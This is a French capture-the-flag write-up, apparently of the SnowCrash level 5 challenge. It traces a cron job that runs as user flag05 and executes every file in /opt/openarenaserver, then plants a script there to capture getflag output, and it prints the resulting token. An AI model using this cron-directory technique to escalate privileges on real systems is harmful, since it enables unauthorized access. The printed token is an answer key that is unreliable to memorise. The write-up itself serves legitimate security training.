## Level 05: 

Dès le login, un message apparaît :
```
You have new mail.  
```
1.  
-> on essaie donc de trouver les mails:
```bash
find / -name mail 2>/dev/null  
```
output:
```
/usr/lib/byobu/mail
/var/mail
/var/spool/mail 
/rofs/usr/lib/byobu/mail 
/rofs/var/mail 
/rofs/var/spool/mail
```

-> on liste tous les résultats:
```bash
ls `find / -name mail 2>/dev/null`
```
output:
```
/rofs/usr/lib/byobu/mail  /usr/lib/byobu/mail  

/rofs/var/mail:
level05

/rofs/var/spool/mail:
level05

/var/mail:
level05 

/var/spool/mail: 
level05 
```
2.  
-> on remarque le fichier level05 dans plusieurs dossiers. On le cat:  
```bash
cat /var/mail/level05
```
output:
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
On reconnait ici une tache cron notamment grâce au format de planification :
```
*/2 * * * *
```

``` su -c ``` est une commande permettant de changer d'utilisateur et l'option ```-c``` permet d'executer la commande qui suit mais sous un autre utilisateur, spécifié après avec ```- flag05```

Ainsi, la ligne
 ```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
dans le crontab permet d'exécuter le script ```/usr/sbin/openarenaserver ``` toutes les 2 minutes sous l'utilisateur flag05  
3.  
Nous examinons le script ```/usr/sbin/openarenaserver``` pour comprendre son fonctionnement :
```bash
cat /usr/sbin/openarenaserver 
```
Output:
```bash
#!/bin/sh 
for i in /opt/openarenaserver/* ; do 
    (ulimit -t 5; bash -x "$i") 
    rm -f "$i"
done
```
On comprend que le script exécute tous les fichiers présents dans ```/opt/openarenaserver``` avec un timeout de 5 secondes, puis les supprime -> faille  
4.  
Pour exploiter cette faille, nous pouvons créer un fichier dans ```/opt/openarenaserver```qui éxecute la commande ```getflag```: 
```bash
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
```
Cette commande nous permet de créer un fichier flag05 dans ```/opt/openarenaserver```dans lequel se trouve la commande ```getflag > /tmp/flag05"```. Cette dernière nous permet de récupérer l'output de la commande ```getflag``` dans ```/tmp/flag05```lorsqu'elle sera éxecuté par le script ```/usr/sbin/openarenaserver``` toutes les 2min par le cron task.  
5.  
Il nous suffit ensuite d'attendre 2min afin que la cron task se lance et récupérer le contenu du fichier ```/tmp/flag05```:
```bash
cat /tmp/flag05
```
Output:
```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
````